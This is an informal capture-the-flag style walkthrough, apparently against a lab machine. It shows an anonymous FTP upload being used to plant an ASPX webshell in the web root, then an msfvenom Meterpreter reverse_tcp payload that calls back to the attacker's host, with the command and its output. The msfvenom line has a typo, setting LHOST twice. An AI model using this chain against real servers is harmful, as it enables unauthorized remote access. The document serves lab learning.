so, we are able to log in to ftp using anonymous account, and we can put files there, also we can display the files unsing the site on port 80: eg http://10.10.10.5/test.txt

let's try to add an aspx shell to the ftp servet
locate cmd.aspx                                                                                                                                                                              1 тип
/usr/share/davtest/backdoors/aspx_cmd.aspx
/usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx


copy a shell to the working forlder then uplopad it on the ftp server

it works, we have a webshell on the machine :-> http://10.10.10.5/cmd.aspx as a POC

now , in order to get a reverse shell, we need to create a custom aspx reverse shell using msfvenom

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.3 LHOST=4444 -f aspx -o shell.aspx       
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2908 bytes
Saved as: shell.aspx


upload the shell to the ftp server

job done!

I was having problem getint a rev shell on my machine because when I uploaded the msfvenom paylod on the FTP server, I used binary mode. By doing this, I couldn't get a rev shell connection.!!!!!!
